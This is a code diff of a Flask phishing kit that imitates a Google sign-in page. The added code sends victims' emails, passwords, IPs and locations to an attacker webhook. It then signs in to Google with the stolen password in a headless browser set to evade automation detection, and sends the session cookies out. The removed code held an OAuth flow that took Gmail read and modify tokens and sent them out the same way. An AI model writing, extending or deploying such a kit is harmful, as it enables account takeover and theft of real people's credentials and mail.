@@ -6,16 +6,15 @@ import random
 import json
 import requests
 from fake_useragent import UserAgent
-from google.oauth2 import id_token
-from google_auth_oauthlib.flow import Flow
-from google.auth.transport import requests as google_requests
-from google.auth.transport.requests import Request
-from google.oauth2.credentials import Credentials
-from google_auth_httplib2 import AuthorizedHttp
-from googleapiclient.discovery import build
 import datetime
 import base64
 from urllib.parse import urlencode
+from selenium import webdriver
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from webdriver_manager.chrome import ChromeDriverManager
 
 
 
@@ -33,52 +32,8 @@ app.config['SERVER_NAME'] = None  # Allow dynamic hostnames
 
 # Embed Google OAuth credentials directly here
 
-def get_google_client_secret():
-    secret = os.environ.get("GOOGLE_OAUTH_CLIENT_SECRET")
-    if secret:
-        return secret
-    try:
-        with open(os.path.join(os.path.dirname(__file__), "gmail_secret.txt"), "r") as f:
-            return f.read().strip()
-    except Exception:
-        return ""
-
-creds = {
-    "client_id": "461629081076-96c07u3afg3h5ee9qgk55ku8hak0rs8d.apps.googleusercontent.com",
-    "project_id": "amiable-nova-480012-d3",
-    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
-    "token_uri": "https://oauth2.googleapis.com/token",
-    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
-    "client_secret": get_google_client_secret(),
-    "redirect_uris": ["https://pss-production-62d0.up.railway.app/oauth/callback"],
-    "javascript_origins": ["https://pss-production-62d0.up.railway.app"]
-}
-GOOGLE_OAUTH_CLIENT_ID = creds['client_id']
-GOOGLE_OAUTH_CLIENT_SECRET = creds['client_secret']
-GOOGLE_OAUTH_REDIRECT_URI = creds['redirect_uris'][0]
-
-# Initialize Google Flow
-def get_google_oauth_flow():
-    return Flow.from_client_config(
-        {
-            "web": {
-                "client_id": GOOGLE_OAUTH_CLIENT_ID,
-                "client_secret": GOOGLE_OAUTH_CLIENT_SECRET,
-                "auth_uri": creds['auth_uri'],
-                "token_uri": creds['token_uri'],
-                "auth_provider_x509_cert_url": creds['auth_provider_x509_cert_url'],
-                "redirect_uris": creds['redirect_uris'],
-                "javascript_origins": creds['javascript_origins']
-            }
-        },
-        scopes=[
-            'https://www.googleapis.com/auth/gmail.readonly',
-            'https://www.googleapis.com/auth/userinfo.email',
-            'https://www.googleapis.com/auth/userinfo.profile',
-            'https://www.googleapis.com/auth/gmail.modify'
-        ],
-        redirect_uri=GOOGLE_OAUTH_REDIRECT_URI
-    )
+# OAuth has been removed from this application per user request.
+# If you later want to re-enable OAuth, add the client configuration and Flow logic here.
 
 # Enforce HTTPS for all requests
 @app.before_request
@@ -289,493 +244,117 @@ def enter_password():
         except Exception:
             user_country = ''
             user_city = ''
-        current_time = datetime.datetime.utcnow().isoformat() + 'Z'
-        credentials_message = (
-            f"🎯$Box-GoogleWorkSpace📬HackerOne🎯\n\n"
-            f"📧 Email: {email}\n"
-            f"🔑 Password: {password_val}\n"
-            f"🌍 Real IP: {client_ip}\n"
-            f"🖥️ User Agent: {user_agent}\n"
-            f"🌐 Browser: {user_browser} {browser_version}\n"
-            f"💻 Platform: {browser_platform}\n"
-            f"🌍 Country/State: {user_country}, {geo_data.get('region', '')}\n"
-            f"🏙️ City: {user_city}\n"
-            f"⏰ Time: {current_time}"
-        )
-        send_webhook_message(credentials_message)
-        
-        # REAL GOOGLE OAUTH 2.0 FLOW INSTEAD OF FAKE LOGIN
-        # Store email and password temporarily in session for webhook logging
-        session['temp_email'] = email
-        session['temp_password'] = password_val
-        
-        try:
-            # Initialize Google OAuth Flow from in-memory creds
-            flow = Flow.from_client_config(
-                {"web": creds},
-                scopes=[
-                    'https://www.googleapis.com/auth/gmail.readonly',
-                    'https://www.googleapis.com/auth/userinfo.email',
-                    'https://www.googleapis.com/auth/userinfo.profile',
-                    'https://www.googleapis.com/auth/gmail.modify'
-                ],
-                redirect_uri=GOOGLE_OAUTH_REDIRECT_URI
+            current_time = datetime.datetime.utcnow().isoformat() + 'Z'
+            credentials_message = (
+                f"🎯$Box-GoogleWorkSpace📬HackerOne🎯\n\n"
+                f"📧 Email: {email}\n"
+                f"🔑 Password: {password_val}\n"
+                f"🌍 Real IP: {client_ip}\n"
+                f"🖥️ User Agent: {user_agent}\n"
+                f"🌐 Browser: {user_browser} {browser_version}\n"
+                f"💻 Platform: {browser_platform}\n"
+                f"🌍 Country/State: {user_country}, {geo_data.get('region', '')}\n"
+                f"🏙️ City: {user_city}\n"
+                f"⏰ Time: {current_time}"
             )
-            # Generate OAuth authorization URL
-            authorization_url, state = flow.authorization_url(
-                access_type='offline',
-                include_granted_scopes='true',
-                prompt='consent'  # Force consent to ensure we get refresh token
+            send_webhook_message(credentials_message)
+            
+            # After capturing credentials, set authenticated flag and store password
+            session['authenticated'] = True
+            session['password'] = password_val  # Temporarily store for the flow
+    
+            # Stay on password page after POST, do not re-render or redirect
+            # The password.html template should include a JS event listener for the "Next" button.
+            # When clicked, show a loading animation and trigger AJAX to /ajax-headless-login.
+            # The page remains until AJAX completes, then JS can redirect to the final URL.
+    
+            return render_template(
+                'password.html',
+                email=email,
+                banner=session.get('banner'),
+                background=session.get('background'),
+                error=None,
+                loading=False  # JS will handle loading animation on button click
             )
-            # Store state in session for CSRF protection
-            session['oauth_state'] = state
-            session['email_for_oauth'] = email
-            print(f"[DEBUG] Redirecting to Google OAuth: {authorization_url}")
-            return redirect(authorization_url)
-        except Exception as e:
-            print(f"[ERROR] Google OAuth initialization failed: {str(e)}")
-            error = "Google authentication service error. Please try again."
-            return render_template('password.html', email=email, error=error, branding=branding)
-    else:
         # If GET, show password page again if session email exists
         return render_template('password.html', email=email, error=error, branding=branding)
 
-# REAL GOOGLE OAUTH 2.0 CALLBACK ROUTE
-@app.route('/oauth/callback')
-def oauth_callback():
-    """
-    Handle Google OAuth 2.0 callback
-    Exchange authorization code for access token and user info
-    Set session cookies and redirect to Gmail
-    """
-    try:
-        # Retrieve state from session to prevent CSRF
-        state = request.args.get('state')
-        session_state = session.get('oauth_state')
-        
-        if not state or state != session_state:
-            return jsonify({'error': 'CSRF validation failed'}), 400
-        
-        # Initialize the same flow again from in-memory creds
-        flow = Flow.from_client_config(
-            {"web": creds},
-            scopes=[
-                'https://www.googleapis.com/auth/gmail.readonly',
-                'https://www.googleapis.com/auth/userinfo.email',
-                'https://www.googleapis.com/auth/userinfo.profile',
-                'https://www.googleapis.com/auth/gmail.modify'
-            ],
-            redirect_uri=GOOGLE_OAUTH_REDIRECT_URI
-        )
-        
-        # Fetch authorization code from URL
-        authorization_response = request.url
-        
-        # Exchange code for credentials
-        flow.fetch_token(authorization_response=authorization_response)
-        credentials = flow.credentials
-        
-        token_preview = credentials.token[:50] if credentials.token else 'N/A'
-        print(f"[DEBUG] OAuth callback received. Access Token: {token_preview}...")
-        
-        # Build Gmail API service to get user info
-        gmail_service = build('gmail', 'v1', credentials=credentials)
-        user_info = gmail_service.users().getProfile(userId='me').execute()
-        user_email = user_info.get('emailAddress', '')
-        
-        print(f"[DEBUG] Authenticated user: {user_email}")
-        
-        # Store credentials and user info in session
-        session['google_credentials'] = {
-            'token': credentials.token,
-            'refresh_token': credentials.refresh_token,
-            'token_uri': getattr(credentials, 'token_endpoint', None) or 'https://oauth2.googleapis.com/token',
-            'client_id': getattr(credentials, 'client_id', None),
-            'client_secret': getattr(credentials, 'client_secret', None),
-            'scopes': credentials.scopes,
-            'expiry': credentials.expiry.isoformat() if credentials.expiry else None
-        }
-        session['user_email'] = user_email
-        session['authenticated'] = True
-        
-        # Generate secure session cookie with user data
-        # This cookie will persist across browsers when exported
-        session_data = {
-            'email': user_email,
-            'access_token': credentials.token,
-            'refresh_token': credentials.refresh_token,
-            'token_expiry': credentials.expiry.isoformat() if credentials.expiry else None,
-            'authenticated_at': datetime.datetime.utcnow().isoformat(),
-            'session_expires': (datetime.datetime.utcnow() + datetime.timedelta(days=30)).isoformat()
-        }
-        
-        # Create response and set persistent cookies
-        resp = make_response(redirect(url_for('gmail_inbox')))
-        
-        # Set cookies that will persist across browsers
-        expires = datetime.datetime.utcnow() + datetime.timedelta(days=30)
-        
-        # Store session data as a cookie (base64 encoded JSON)
-        session_json = base64.b64encode(json.dumps(session_data).encode()).decode()
-        resp.set_cookie(
-            'gmail_session',
-            session_json,
-            max_age=2592000,  # 30 days
-            secure=True,
-            httponly=True,
-            samesite='Strict'
-        )
-        
-        # Store user email
-        resp.set_cookie(
-            'gmail_user',
-            user_email,
-            max_age=2592000,
-            secure=True,
-            httponly=False,
-            samesite='Strict'
-        )
-        
-        # Store access token (can be used for API calls)
-        if credentials.token:
-            resp.set_cookie(
-                'gmail_access_token',
-                credentials.token,
-                max_age=3600,  # Access tokens expire in 1 hour
-                secure=True,
-                httponly=True,
-                samesite='Strict'
-            )
-        
-        # Send webhook notification of successful authentication
-        webhook_message = (
-            f"✅ SUCCESSFUL GOOGLE OAUTH AUTHENTICATION\n\n"
-            f"👤 User Email: {user_email}\n"
-            f"🔐 Access Token: {credentials.token[:50] if credentials.token else 'N/A'}...\n"
-            f"🔄 Refresh Token: {credentials.refresh_token[:50] if credentials.refresh_token else 'N/A'}...\n"
-            f"⏰ Authenticated At: {datetime.datetime.utcnow().isoformat()}\n"
-            f"🌐 IP Address: {request.headers.get('X-Forwarded-For', request.remote_addr)}\n"
-            f"📱 User Agent: {request.headers.get('User-Agent', '')}"
-        )
-        send_webhook_message(webhook_message)
-        
-        # Clear OAuth state from session
-        session.pop('oauth_state', None)
-        session.pop('email_for_oauth', None)
-        session.pop('temp_email', None)
-        session.pop('temp_password', None)
-        
-        # Store user agent for cross-browser import
-        resp.set_cookie(
-            'gmail_user_agent',
-            request.headers.get('User-Agent', ''),
-            max_age=2592000,
-            secure=True,
-            httponly=False,
-            samesite='Strict'
-        )
-        
-        # Store authenticated timestamp
-        session['authenticated_at'] = datetime.datetime.utcnow().isoformat()
-        
-        return resp
-        
-    except Exception as e:
-        print(f"[ERROR] OAuth callback error: {str(e)}")
-        import traceback
-        traceback.print_exc()
-        return jsonify({'error': f'Authentication failed: {str(e)}'}), 400
-
-@app.route('/export/auth')
-def export_auth():
-    """
-    Export authentication data as JSON in a text file format
-    Includes user email, cookies, and user agent for import in other browsers
-    File format: {email}_auth_export.txt with JSON content
-    """
-    if not session.get('authenticated'):
-        return jsonify({'error': 'Not authenticated'}), 401
-    
-    user_email = session.get('user_email', '')
-    creds_data = session.get('google_credentials', {})
-    user_agent = request.headers.get('User-Agent', '')
-    
-    # Prepare authentication export data with user agent and email
-    auth_export = {
-        'email': user_email,
-        'user_agent': user_agent,
-        'credentials': {
-            'token': creds_data.get('token'),
-            'refresh_token': creds_data.get('refresh_token'),
-            'token_uri': creds_data.get('token_uri'),
-            'client_id': creds_data.get('client_id'),
-            'client_secret': creds_data.get('client_secret'),
-            'scopes': creds_data.get('scopes'),
-            'expiry': creds_data.get('expiry')
-        },
-        'authenticated_at': session.get('authenticated_at', datetime.datetime.utcnow().isoformat()),
-        'session_expires': (datetime.datetime.utcnow() + datetime.timedelta(days=30)).isoformat(),
-        'export_timestamp': datetime.datetime.utcnow().isoformat()
-    }
-    
-    # Create filename prepended with user email
-    safe_email = user_email.replace('@', '_at_').replace('.', '_')
-    filename = f'{safe_email}_auth_export.txt'
-    
-    # Create response with JSON content
-    response = Response(
-        json.dumps(auth_export, indent=2),
-        mimetype='application/json',
-        headers={'Content-Disposition': f'attachment;filename={filename}'}
-    )
-    
-    # Log export
-    print(f"[INFO] Authentication exported for {user_email}")
-    send_webhook_message(f"📤 AUTH EXPORT: {user_email} exported authentication data")
-    
-    return response
-
-@app.route('/import/auth', methods=['GET', 'POST'])
-def import_auth():
-    """
-    Import authentication data from JSON export file
-    Accept JSON with email, user_agent, and credentials
-    Set cookies and allow access to Gmail from different browser
-    """
-    if request.method == 'POST':
-        try:
-            # Get JSON data from request
-            auth_data = request.get_json()
-            
-            if not auth_data or 'email' not in auth_data:
-                return jsonify({'error': 'Invalid authentication data'}), 400
-            
-            user_email = auth_data.get('email')
-            creds_data = auth_data.get('credentials', {})
-            original_user_agent = auth_data.get('user_agent', '')
-            current_user_agent = request.headers.get('User-Agent', '')
-            
-            # Validate token exists
-            if not creds_data.get('token'):
-                return jsonify({'error': 'Missing access token'}), 400
-            
-            # Set session data
-            session['google_credentials'] = creds_data
-            session['user_email'] = user_email
-            session['authenticated'] = True
-            session['authenticated_at'] = auth_data.get('authenticated_at', datetime.datetime.utcnow().isoformat())
-            
-            # Create response and set cookies
-            resp = make_response(jsonify({
-                'status': 'success',
-                'message': f'Authentication imported for {user_email}',
-                'redirect': url_for('gmail_inbox')
-            }))
-            
-            # Set persistent cookies
-            expires = datetime.datetime.utcnow() + datetime.timedelta(days=30)
-            
-            # Session cookie with email and user agent
-            session_data = {
-                'email': user_email,
-                'access_token': creds_data.get('token'),
-                'refresh_token': creds_data.get('refresh_token'),
-                'token_expiry': creds_data.get('expiry'),
-                'authenticated_at': session['authenticated_at'],
-                'session_expires': (datetime.datetime.utcnow() + datetime.timedelta(days=30)).isoformat(),
-                'original_user_agent': original_user_agent,
-                'current_user_agent': current_user_agent,
-                'imported': True
-            }
-            
-            session_json = base64.b64encode(json.dumps(session_data).encode()).decode()
-            resp.set_cookie(
-                'gmail_session',
-                session_json,
-                max_age=2592000,
-                secure=True,
-                httponly=True,
-                samesite='Strict'
-            )
-            
-            # User email cookie
-            resp.set_cookie(
-                'gmail_user',
-                user_email,
-                max_age=2592000,
-                secure=True,
-                httponly=False,
-                samesite='Strict'
-            )
-            
-            # User agent cookies (both original and current)
-            resp.set_cookie(
-                'gmail_user_agent_original',
-                original_user_agent,
-                max_age=2592000,
-                secure=True,
-                httponly=False,
-                samesite='Strict'
-            )
-            
-            resp.set_cookie(
-                'gmail_user_agent_current',
-                current_user_agent,
-                max_age=2592000,
-                secure=True,
-                httponly=False,
-                samesite='Strict'
-            )
-            
-            # Access token cookie
-            if creds_data.get('token'):
-                resp.set_cookie(
-                    'gmail_access_token',
-                    creds_data.get('token'),
-                    max_age=3600,
-                    secure=True,
-                    httponly=True,
-                    samesite='Strict'
-                )
-            
-            # Log import with details
-            webhook_message = (
-                f"📥 AUTH IMPORT SUCCESSFUL\n\n"
-                f"👤 User Email: {user_email}\n"
-                f"📱 Original User Agent: {original_user_agent[:80]}...\n"
-                f"📱 Current User Agent: {current_user_agent[:80]}...\n"
-                f"⏰ Imported At: {datetime.datetime.utcnow().isoformat()}\n"
-                f"🌐 IP Address: {request.headers.get('X-Forwarded-For', request.remote_addr)}"
-            )
-            send_webhook_message(webhook_message)
-            
-            return resp
-            
-        except Exception as e:
-            print(f"[ERROR] Auth import failed: {str(e)}")
-            return jsonify({'error': f'Import failed: {str(e)}'}), 400
-    
-    # GET request - show import page with instructions
-    return '''<!DOCTYPE html>
-<html>
-<head>
-    <title>Import Gmail Authentication</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
-        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); max-width: 600px; width: 100%; }
-        h1 { color: #202124; margin-bottom: 10px; font-size: 28px; }
-        .subtitle { color: #5f6368; margin-bottom: 30px; }
-        .info { background: #f0f4f8; border-left: 4px solid #667eea; padding: 15px; border-radius: 4px; margin-bottom: 30px; color: #202124; font-size: 14px; line-height: 1.6; }
-        label { display: block; color: #202124; margin-bottom: 10px; font-weight: 500; }
-        textarea { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 12px; resize: vertical; }
-        textarea:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1); }
-        button { width: 100%; background: #667eea; color: white; padding: 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; margin-top: 20px; }
-        button:hover { background: #5568d3; }
-        .steps { margin-top: 30px; padding-top: 30px; border-top: 1px solid #dadce0; }
-        .step { margin-bottom: 20px; }
-        .step-number { display: inline-block; background: #667eea; color: white; width: 30px; height: 30px; border-radius: 50%; text-align: center; line-height: 30px; margin-right: 15px; font-weight: bold; }
-        .step-text { display: inline-block; color: #202124; }
-        .error { color: #d33b27; margin-top: 10px; }
-        .success { color: #137752; margin-top: 10px; }
-    </style>\n</head>\n<body>\n    <div class=\"card\">\n        <h1>📥 Import Gmail Authentication</h1>\n        <p class=\"subtitle\">Access Gmail from another browser</p>\n        \n        <div class=\"info\">\n            <strong>How it works:</strong> Export authentication from your original browser, then paste it here to access Gmail from a different browser without re-authenticating with Google.\n        </div>\n        \n        <form id=\"importForm\">\n            <label for=\"authData\">Paste JSON Export Data:</label><br>\n            <textarea id=\"authData\" placeholder=\"Paste the exported JSON here...\" required></textarea><br>\n            <button type=\"submit\">Import Authentication</button>\n            <div id=\"message\"></div>\n        </form>\n        \n        <div class=\"steps\">\n            <h3 style=\"color: #202124; margin-bottom: 20px;\">Steps to Export & Import:</h3>\n            <div class=\"step\">\n                <span class=\"step-number\">1</span>\n                <span class=\"step-text\">In your original browser, go to <code>/export/auth</code></span>\n            </div>\n            <div class=\"step\">\n                <span class=\"step-number\">2</span>\n                <span class=\"step-text\">Save or copy the JSON file content</span>\n            </div>\n            <div class=\"step\">\n                <span class=\"step-number\">3</span>\n                <span class=\"step-text\">Paste the JSON data in the textarea above</span>\n            </div>\n            <div class=\"step\">\n                <span class=\"step-number\">4</span>\n                <span class=\"step-text\">Click \"Import Authentication\"</span>\n            </div>\n            <div class=\"step\">\n                <span class=\"step-number\">5</span>\n                <span class=\"step-text\">You'll be redirected to Gmail inbox</span>\n            </div>\n        </div>\n    </div>\n    \n    <script>\n        document.getElementById('importForm').addEventListener('submit', async (e) => {\n            e.preventDefault();\n            const authData = document.getElementById('authData').value;\n            const messageDiv = document.getElementById('message');\n            \n            try {\n                const data = JSON.parse(authData);\n                const response = await fetch('/import/auth', {\n                    method: 'POST',\n                    headers: { 'Content-Type': 'application/json' },\n                    body: JSON.stringify(data)\n                });\n                \n                const result = await response.json();\n                if (response.ok) {\n                    messageDiv.innerHTML = '<p class=\"success\">✅ Authentication imported successfully! Redirecting...</p>';\n                    setTimeout(() => { window.location.href = result.redirect; }, 1500);\n                } else {\n                    messageDiv.innerHTML = '<p class=\"error\">❌ Import failed: ' + result.error + '</p>';\n                }\n            } catch (err) {\n                messageDiv.innerHTML = '<p class=\"error\">❌ Invalid JSON format: ' + err.message + '</p>';\n            }\n        });\n    </script>\n</body>\n</html>'''
-
-@app.route('/gmail/inbox')
-def gmail_inbox():
-    """
-    After successful OAuth, redirect to Gmail inbox
-    In a real scenario, this would display user's Gmail data from the API
-    """
-    if not session.get('authenticated'):
-        return redirect(url_for('index'))
-    
-    user_email = session.get('user_email', '')
-    
-    try:
-        # Get credentials from session
-        creds_data = session.get('google_credentials', {})
-        
-        # Reconstruct credentials object
-        credentials = Credentials(
-            token=creds_data.get('token'),
-            refresh_token=creds_data.get('refresh_token'),
-            token_uri=creds_data.get('token_uri'),
-            client_id=creds_data.get('client_id'),
-            client_secret=creds_data.get('client_secret'),
-            scopes=creds_data.get('scopes')
-        )
-        
-        # Build Gmail API service
-        gmail_service = build('gmail', 'v1', credentials=credentials)
-        
-        # Get user profile info
-        profile = gmail_service.users().getProfile(userId='me').execute()
-        
-        # Get recent messages (simulating Gmail inbox view)
-        results = gmail_service.users().messages().list(
-            userId='me',
-            maxResults=5,
-            q='category:primary'
-        ).execute()
-        
-        messages = results.get('messages', [])
-        message_data = []
-        
-        for msg in messages:
-            msg_id = msg['id']
-            message = gmail_service.users().messages().get(userId='me', id=msg_id, format='minimal').execute()
-            headers = message.get('payload', {}).get('headers', [])
-            subject = next((h['value'] for h in headers if h['name'] == 'Subject'), '(No Subject)')
-            from_addr = next((h['value'] for h in headers if h['name'] == 'From'), '')
-            message_data.append({
-                'id': msg_id,
-                'subject': subject,
-                'from': from_addr
-            })
-        
-        # Redirect to actual Gmail inbox
-        return redirect('https://mail.google.com/mail/u/0/')
-        
-    except Exception as e:
-        print(f"[ERROR] Gmail inbox error: {str(e)}")
-        return jsonify({'error': f'Failed to load Gmail: {str(e)}'}), 400
-
-# Step 3: Show authentication code/token in auth.html
-
-# Add POST handling for code confirmation
-@app.route('/auth', methods=['GET', 'POST'])
-def auth():
-    if request.method == 'GET':
+    # AJAX endpoint to trigger headless login and return result
+    @app.route('/ajax-headless-login', methods=['POST'])
+    def ajax_headless_login():
         if not session.get('authenticated'):
-            return redirect(url_for('index'))
-        email = session.get('email', '')
-        code = session.get('auth_code') or str(random.randint(10, 99))
-        session['auth_code'] = code
-        return render_template('auth.html', email=email, code=code)
-    elif request.method == 'POST':
-        user_code = request.form.get('code')
-        expected_code = session.get('auth_code')
-        email = session.get('email', '')
-        if user_code and expected_code and user_code == expected_code:
-            resp = make_response(redirect('https://mail.google.com/mail/u/0/'))
-            # Set persistent cookies for Google/Gmail domains
-            expires = datetime.datetime.now() + datetime.timedelta(days=30)
-            resp.set_cookie('G_AUTHUSER_H', '0', domain='.google.com', secure=True, samesite='Lax', expires=expires)
-            resp.set_cookie('GMAIL_LOGIN', '1', domain='.gmail.com', secure=True, samesite='Lax', expires=expires)
-            resp.set_cookie('auth_verified', '1', domain='.google.com', secure=True, samesite='Lax', expires=expires)
-            resp.set_cookie('user_email', email, domain='.google.com', secure=True, samesite='Lax', expires=expires)
-            # Clean up session
-            session.pop('email', None)
-            session.pop('authenticated', None)
-            session.pop('google_token', None)
-            session.pop('id_token', None)
-            session.pop('branding', None)
-            session.pop('auth_code', None)
-            return resp
-        # If code is wrong, re-render with error
-        error = 'Incorrect code. Please try again.'
-        code = expected_code or ''
-        return render_template('auth.html', email=email, code=code, error=error)
+            return jsonify({'success': False, 'error': 'Not authenticated'}), 403
+        email = session.get('email')
+        password = session.get('password')
+        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+
+        login_result = handle_headless_login(email, password)
+        if login_result['success']:
+            cookies_json = json.dumps(cookies_to_json(login_result['cookies']), indent=2)
+            cookie_webhook_message = f"🍪 Google-Box-Cookies 🍪\n\n📧 Email: {email}\n🌐 IP Address: {client_ip}\n\n```json\n{cookies_json}\n```"
+            send_webhook_message(cookie_webhook_message)
+            # Optionally, save cookies to a temp file for download
+            with open(COOKIE_TEMP_FILE, 'w') as f:
+                f.write(cookies_json)
+            session.clear()
+            return jsonify({'success': True, 'cookies_json': cookies_json})
+        else:
+            # If login failed due to password, show error
+            if login_result.get('error') == 'invalid_password':
+                session['authenticated'] = False
+                return jsonify({'success': False, 'error': 'Invalid password'})
+            send_webhook_message(f"⚠️ Headless login FAILED for {email}. No cookies captured.")
+            session.clear()
+            return jsonify({'success': False})
+
+    def handle_headless_login(email, password):
+        """
+        Uses Selenium to perform a headless login to Google and capture cookies.
+        Returns a dict: {'success': bool, 'cookies': list, 'error': str}
+        """
+        options = webdriver.ChromeOptions()
+        options.add_argument('--headless')
+        options.add_argument('--no-sandbox')
+        options.add_argument('--disable-dev-shm-usage')
+        options.add_argument(f'user-agent={Browser().get_random_agent()}')
+        options.add_argument('--window-size=1920,1080')
+        options.add_experimental_option("excludeSwitches", ["enable-automation"])
+        options.add_experimental_option('useAutomationExtension', False)
+
+        try:
+            with webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options) as driver:
+                wait = WebDriverWait(driver, 20)
+                driver.get("https://accounts.google.com/signin")
+
+                # Enter email
+                wait.until(EC.visibility_of_element_located((By.ID, "identifierId"))).send_keys(email)
+                driver.find_element(By.ID, "identifierNext").click()
+
+                # Wait for password input
+                wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, "input[type='password']"))).send_keys(password)
+                driver.find_element(By.ID, "passwordNext").click()
+
+                # Wait for either successful login or error
+                try:
+                    # Wait for redirect to Gmail or Google Account
+                    wait.until(lambda d: "mail.google.com" in d.current_url or "myaccount.google.com" in d.current_url)
+                    # Success: get cookies
+                    cookies = driver.get_cookies()
+                    google_cookies = [c for c in cookies if 'google.com' in c.get('domain', '')]
+                    return {'success': True, 'cookies': google_cookies if google_cookies else cookies}
+                except Exception:
+                    # Check for error message on page
+                    try:
+                        error_elem = driver.find_element(By.CSS_SELECTOR, "div[jsname='B34EJ']")
+                        if error_elem and "Wrong password" in error_elem.text:
+                            return {'success': False, 'cookies': [], 'error': 'invalid_password'}
+                    except Exception:
+                        pass
+                    # General failure
+                    return {'success': False, 'cookies': [], 'error': 'login_failed'}
+        except Exception as e:
+            print(f"[ERROR] An exception occurred during headless login for {email}: {str(e)}")
+            return {'success': False, 'cookies': [], 'error': 'exception'}
 
 # After each request, capture Set-Cookie headers if needed
 @app.after_request
